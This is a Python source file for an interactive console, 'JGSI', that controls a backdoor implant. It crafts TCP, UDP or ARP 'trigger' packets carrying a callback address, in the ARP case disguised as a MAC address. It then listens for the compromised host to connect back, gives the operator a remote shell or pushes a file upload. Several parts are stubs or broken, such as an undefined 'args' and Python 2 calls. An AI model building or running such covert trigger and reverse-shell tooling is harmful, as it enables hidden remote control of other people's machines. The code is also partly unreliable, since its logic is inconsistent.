#!/usr/bin/python3
import socket
import struct
import netaddr
import sys
import select
import netifaces
import cmd
import pickle
import os
import ipaddress
import readline
from scapy.all import *


OKBLUE       = '\033[94m'
RED          = '\033[31m'
RED_BLINK    = '\033[31;5m'
RED_BOLD     = '\033[31;1m'
RESET        = '\033[0m'
YELLOW       = '\033[33m'
YELLOW_BLINK = '\033[33;5m'
OVERWRITE    = '\033[1000D'


class JGSIshell(cmd.Cmd):
    intro = ("" + RED +\
                u"                    ██╗ ██████╗ ███████╗ ██╗\n" +\
                u"                    ██║██╔════╝ ██╔════╝ ██║\n" +\
                u"                    ██║██║  ███╗███████╗ ██║\n" +\
                u"               ██   ██║██║   ██║╚════██║ ██║\n" +\
                u"               ╚█████╔╝╚██████╔╝███████║ ██║\n" +\
                u"                ╚════╝  ╚═════╝ ╚══════╝ ╚═╝\n\n" + RESET)


    prompt = "JGSI ->"
    ruler = '~'
    local_addresses = []
    triggers = []

    # Acquire local address (hopefully not picking the loopback address)
    try:
        for interface in netifaces.interfaces():
            local_addresses.append(netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr'])
    except KeyError as err:
            print("Interface %s",interface," does not have an IP address")

    local_ip = local_addresses[-1]


    def do_build_trigger(self,arg):
        'Build TArp Trigger'
        self.triggers.append(self.buildTrigger())

    def do_load_triggers(self,arg):
        'Reload previously created triggers'

    def buildTrigger(self):
        'Code block to build the trigger'

        unique = False
        tName = input("Enter uniquer trigger name: ")
        while not unique:
            if len(self.triggers) != 0:
                for tgr in self.triggers:
                    if str(tgr.name) == str(tName):
                        print("trigger name already in use")
                    else:
                        unique = True
            else:
                unique = True

        try:
            sAddr = ipaddress.IPv4Address(input("Enter Source Address: "))
        except ValueError:
            print("Invalid IPv4 address: ")
            sAddr = ipaddress.IPv4Address(input("Enter a valid source Address: "))

        try:
            tAddr = ipaddress.IPv4Address(input("Enter Target Address: "))
        except ValueError:
            print("Invalid IPv4 address: ")
            tAddr = ipaddress.IPv4Address(input("Enter valid IPv4 target address: "))


        tPort = input("Enter trigger dest port: ")
        if not self.validPort(tPort):
            tPort = input("Enter a valid dest port: ")
       
        sPort = input("Enter source port: ")
        if not self.validPort(sPort):
            sPort = input("Enter a valid source port: ")

        tType = str.upper(input("Enter trigger type (ARP | UDP | TCP): "))
        if not self.validateType(tType):
            tType = str.upper(input("Type must be (ARP | UDP | TCP): "))

        cPort = input("Enter call back port: ")
        if not self.validPort(cPort):
            cPort = input("Enter a valid source port: ")
        
        try:
            callback = ipaddress.IPv4Address(input("Enter call back address: "))
        except ValueError:
            callback = ipaddress.IPv4Address(input("Enter a valid call back address: "))

        if(self.validateInput(tPort,tType,sPort,cPort)):
            trigger = Trigger(tName,sAddr,tAddr,tPort,tType,sPort,cPort,callback)
            return trigger
        else:
            print("ERROR building trigger")
            return "NONE"
   
    def do_list_triggers(self,arg):
        'Show available triggers'
        for tgr in self.triggers:
            msg0 = "======TRIGGER " + str(tgr.name) + " DETAILS===="
            print(msg0)
            msg00 = "SOURCE: " + str(tgr.source)
            Display().info(msg00)
            msg = "TARGET : " + str(tgr.targetAddr)
            Display().info(msg)
            msg1 = "TARGET PORT: " + str(tgr.targetPort)
            Display().info(msg1)
            msg2 = "Source PORT: " + str(tgr.sPort)
            Display().info(msg2)
            msg3 = "TYPE : " + str(tgr.triggerType)
            Display().info(msg3)
            msg4 = "CALLBACK PORT: " + str(tgr.cPort)
            Display().info(msg4)
            msg5 = "CALLBACK ADDR: " + str(tgr.callbackAddr)
            Display().info(msg5)
        
    def do_send_trigger(self,arg):
        'Send trigger'
        
    def do_exit(self,arg):
        'Exit JGSI'
        print("JGSI -> FIMO")
        exit(1)

    def do_save_triggers(self,arg):
        'Work in progress, dead command for now'
    
    def validPort(self,port):
        validPort = False

        if int(port) < 0 :
            print("Ports can not be negative")
        elif int(port) > 0:
            if int(port) < 1024:
                msg = "[INFO] Port " + str(port) + " requires root permissions"
                Display().alert(msg)
                validPort = True
            elif int(port) <= 65535:
                validPort = True
            else:
                print("Ports do not exist above 65535")
        else:
            print("Error validating port ",port)

        return validPort

    def validateType(self,tType):
        validType = False
        if (tType == "ARP"):
            validType = True
        elif (tType == "UDP"):
            validType = True
        elif (tType == "TCP"):
            validType = True
        else:
            validType = False

        return validType

    def open_file(in_file):
        try:
            f = open(in_file)
        except IOError as err:
            print(in_file)
            print(err.strerror)
            sys.exit(2)
        return f

    def validateInput(self,tPort,tType,sPort,cPort):
        validatedInput = True
        validInputs = {"tPort" : False, "tType" : False, "sPort" : False
                , "cPort" : False}

        validInputs.update(tPort=self.validPort(tPort))
        validInputs.update(tType=self.validateType(tType))
        validInputs.update(sPort=self.validPort(sPort))
        validInputs.update(cPort=self.validPort(cPort))

        for key,val in validInputs.items():
            if val == True:
                pass
            else:
                print(key," is invalid")
                return False

        return validatedInput

    def trigger_prompt(packet,trigger):
        'Displays the created trigger that will be sent to the target for verification of details prior to firing.  Receives packet(p) and the full args object.'
    

        if trigger.triggerType == 'tcp' or trigger.triggerType == 'udp':
            print("\nPreparing to send a trigger packet with the folowing details...\n")
            print("========IP Header======")
            print("Source: %s" % packet.src)
            print("Dest  : %s" % packet.dst)
            print("=======%s Header======" % trigger.tType.upper())
            print("SPort : %s" % packet.sport)
            print("DPort : %s" % packet.dport)
            print("=====Callback Data=====")
            print("IP    : %s" % trigger.callback)
            print("Port  : %s" % trigger.cPort)
            '''if args.upload:
                print "======File Upload======"
                print args.upload.name
            else:
                print "====Shell Callback====="'''
            print("==========================")
        
            resp = raw_input("\nReady to send it? ").lower()
            if resp == "yes" or resp == "y":
                sendIT = True
            elif resp == "no" or resp == "n":
                print("Not gonna send it...")
                sendIT = False
            
            return sendIT

        else:
            print("\nPreparing to send a trigger packet with the folowing details...\n")
            print("========ARP Header========")
            print("HwDst  : %s" % packet.hwdst)
            print("HwSrc  : %s" % ":".join(packet.hwsrc))
            print("======Callback Data=======")
            print("IP    : %s" % trigger.callback)
            print("Port  : %s" % trigger.cPort)

            '''if args.upload:
                print("=======File Upload========")
            else:
                print("======Shell Callback=======")'''
            
            print("==========================")
        
            resp = raw_input("\nReady to send it? ").lower()
            if resp == "yes" or resp == "y":
                sendIT = True
            elif resp == "no" or resp == "n":
                print("Not gonna send it...")
                sendIT = False
            
            return sendIT

    def handle_shell(callback, c_info):
        sys.stdout.write("%s%s>%s" % (RED_BOLD,c_info[0],RESET))
        sys.stdout.flush()
        while True:

            # ulitizes select to determine which stream has data to be received from
            sock_list = [sys.stdin,callback]
            read_sockets, write_socket, error_socket = select(sock_list,[],[])

            for sock in read_sockets:
                if sock == callback:
                    data = b""
                    buffer = 1024
                    while True:
                        message = sock.recv(buffer)
                        data += message
                        if message[-1] == "\n":
                            break
                    sys.stdout.write("\n" + data + "%s%s>%s" % (RED_BOLD,c_info[0],RESET))
                    sys.stdout.flush()
                else:
                    message = sys.stdin.readline().strip()
                    if message.strip() == "exit":
                        break
                    else:
                        callback.send(message + '\n')
                        sys.stdout.write("%s%s>%s" % (RED_BOLD,c_info[0],RESET))
                        sys.stdout.flush()

            if message == "exit":
                callback.send(message + '\n')
                callback.shutdown(socket.SHUT_RDWR)
                callback.close()
                break

    def handle_upload(sock, fd):
   
        chunk = fd.read(1024)
        total = 0
        while(chunk):
            sock.send(chunk)
            total += len(chunk)
            print("Sent %d bytes" % total)
            chunk = fd.read(1024)
        fd.close()
        sock.close()


    def buildPacket(self,trigger):

        display = Display()

        if trigger.triggerType == "tcp":

            ip_layer = IP(dst=args.target,src=args.source)
            tcp_layer = TCP(dport=trigger.targetPort,sport=trigger.sPort)
            callback = Raw(load=struct.pack("!H",args.c_port))/Raw(load=netaddr.IPAddress(args.c_addr).packed)
            packet = ip_layer/tcp_layer/callback
        
            trigger_prompt(trigger,args)

        elif trigger.triggerType == "udp":

            ip_layer = IP(dst=args.target,src=args.source)
            udp_layer = UDP(dport=trigger.targetPort,sport=trigger.sPort)
            callback = Raw(load=struct.pack("!H",args.c_port))/Raw(load=netaddr.IPAddress(args.c_addr).packed)
            trigger = ip_layer/udp_layer/callback

            trigger_prompt(trigger,args)

        elif trigger.triggerType == "arp":

            # build hwsrc field to hide the callback address and port as a pseudo mac address
            callback = []
            callback.append(format(trigger.cPort,'x')[0:2])
            callback.append(format(trigger.cPort,'x')[2:])
 
            for octet in netaddr.IPAddress(trigger.targetAddr).words:
                callback.append(format(octet,'x'))
 
            packet = ARP(pdst = trigger.targetAddr, hwdst = "ff:fe:ff:ff:fe:ff", hwsrc = callback)

            trigger_prompt(packet,args)

        if trigger.callback in local_addresses or "0.0.0.0":

            #print "[%s*%s] Preparing listener." 
            display.info("Preparing listener.")

            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(30)
            try:
                s.bind((trigger.callback,trigger.cPort))
                s.listen(1)
            except:
                #print "[!] Failed to bind listener" % (YELLOW_BINK,RESET)
                display.alert("Failed to bind listener")
                sys.exit(1)

            #print "[*] Ready to receive callback. Sending trigger!" % (RED_BLINK,RESET)
            display.info("Ready to receive callback. Sending trigger!")
            send(packet)
        
            #print "[*] Waiting for callback....." % (RED_BLINK,RESET)
            display.info("Waiting for callback....")
            try:
                callback, c_info = s.accept()
                #print "[%s!%s] Received connection from %s" % (YELLOW_BLINK,c_info[0],RESET)
                display.alert("Received connection from %s" % c_info[0])
            except socket.timeout:
                #print "[%s!%s] No response, exiting..." % (YELLOW_BLINK,RESET)
                display.alert("No response, exiting...")
                sys.exit(1)

            if not args.upload:
                handle_shell(callback, c_info)
            else:
                display.info("Uploading file..")
                handle_upload(callback, args.upload)
                display.info("File upload complete.")

        else:

            #print "\n[!] Callback address does not appear to be on this box.\n Ensure a " +\
                #"listener is ready.\n"
            display.alert("Callback address not on this box. Ensure a listener is ready.")
            raw_input("Press [ENTER] to continue....")
            send(trigger)

    
class Display(object):

    def alert(self,message):
        print("[%s!%s] %s" % (YELLOW_BLINK,RESET,message))

    def info(self,message):
        print("[%s*%s] %s" % (RED,RESET,message))


class Trigger:
    "Class to build TArp Trigger"
    def __init__(self,name,srcAddr,targAddr,dPort,tType,sPort,cPort,callbackAddr):
        self.name = name
        self.source = srcAddr
        self.targetAddr = targAddr
        self.targetPort = dPort
        self.sPort = sPort
        self.triggerType = tType
        self.cPort = cPort
        self.callbackAddr = callbackAddr

    def setTarget(self):
        self.targetAddr = input("Enter the target IP: ")

    def setTargPort(self):
        self.targetPort = input("Enter the target Port: ")

    def setTriggerType(self):
        self.triggerType = input("Enter the trigger type (ARP | UDP | TCP): ")
        
            

if __name__ == "__main__":
   JGSIshell().cmdloop() 
